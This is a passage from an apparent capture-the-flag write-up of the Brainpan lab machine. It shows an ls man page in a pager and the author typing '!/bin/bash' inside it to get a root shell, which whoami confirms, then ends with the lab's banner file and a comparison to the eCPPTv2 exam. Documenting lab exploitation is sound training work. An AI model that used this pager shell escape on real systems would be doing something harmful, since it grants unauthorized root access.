              scale sizes by SIZE before printing them.  E.g., `--block-size=M' prints sizes in units of 1,048,576 bytes.  See SIZE format below.

       -B, --ignore-backups
              do not list implied entries ending with ~

       -c     with -lt: sort by, and show, ctime (time of last modification of file status information) with -l: show ctime and sort by name otherwise: sort by ctime, newest first

       -C     list entries by columns

       --color[=WHEN]
              colorize the output.  WHEN defaults to `always' or can be `never' or `auto'.  More info below

       -d, --directory
              list directory entries instead of contents, and do not dereference symbolic links

       -D, --dired
              generate output designed for Emacs' dired mode

       -f     do not sort, enable -aU, disable -ls --color

       -F, --classify
!/bin/bash  

root@brainpan:/usr/share/man# whoami
root
root@brainpan:/usr/share/man#      
```

And putting **!/bin/bash/** we would be the user root.

```
root@brainpan:~# cat b.txt 
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 



root@brainpan:~# 
```

Finally we finished the laboratory practice, it is very similar to **eCPPTv2** and even more complicated than the exam.
